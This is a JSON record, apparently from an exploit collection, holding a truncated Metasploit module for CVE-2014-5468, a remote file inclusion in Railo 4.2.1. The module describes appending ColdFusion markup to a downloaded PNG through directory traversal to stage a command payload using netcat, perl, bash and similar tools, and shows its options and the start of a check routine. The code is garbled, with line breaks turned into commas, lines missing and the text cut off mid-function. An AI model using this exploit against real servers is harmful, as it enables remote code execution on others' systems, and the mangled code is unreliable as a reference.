{
    "text": "vul_name : Railo 4.2.1 Remote File Inclusion ， vul_cve : CVE-2014-5468 ， vul_poc :  ，  # This module requires Metasploit : http/metasploit.com/download ，  # Current source :  ， require 'msf/core' ， class Metasploit4 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HttpServer ， super ( update_info ( info ,  ， 'Name' => 'Railo Remote File Include' ,  ， 'Description' => ' ， This module exploits a remote file include vulnerability in Railo ,  ， tested against version 4.2.1. First , a call using a vulnerable ， <cffile> line in thumbnail.cfm allows an atacker to download an ， arbitrary PNG file. By appending a .cfm , and taking advantage of ， a directory traversal , an attacker can append cold fusion markup ， to the PNG file , and have it interpreted by the server. This is ， used to stage and execute a fully-fledged payload. ， ' ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [  ， 'Bryan Alexander <drone @ ballastsecurity.net>' ,  # Discovery/PoC ， 'bperry' # metasploited ，  ]  ,  ， ' ，  [ 'CVE' , '2014-5468' ]  ,  ，  [ 'URL' , ' ，  ]  ,  ， 'Payload' => { ， 'Space' => 99999 ,  # if there is disk space , I think we will fit ， 'BadChars' => \" ,  ， 'DisableNops' => true ,  ， 'Compat' => { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'generic netcat perl ruby python bash telnet' ， } ， } ,  ， 'Platform' => %w ( unix )  ,  ， 'Targets' => ，  [  ，  [  ， 'Automatic' ,  ， { ， 'Platform' => [ 'unix' ]  ,  ， 'Arch' => ARCH_CMD ， } ，  ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'Aug 26 2014' )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base URI of the Railo server' , '/railo-context/' ]  )  ,  ， OptInt.new ( 'STAGEWAIT' ,  [ true , 'Number of seconds to wait for stager to download' , 10 ]  )  ，  ]  , self.class )  ， end ， def check ， md5 = '6de48cb72421cfabdce440077a921b25' # /res/images/id.png ， res = send_request_cgi (  ， 'uri' => normalize_uri ( 'res' , 'images' , 'id.png' )  # the targeturi is not used in this request ， fail_with ( Failure : Unknown , 'Server did not respond' )  ， elsif ! res.body ， fail_with ( Failure : Unknown , \"Server responded without a body :  # {res.code} # {res.message}\" )  ， end ， new_md5 = Rex : Text.md5 ( res.body ) ",
    "time": "2014.09.12"
}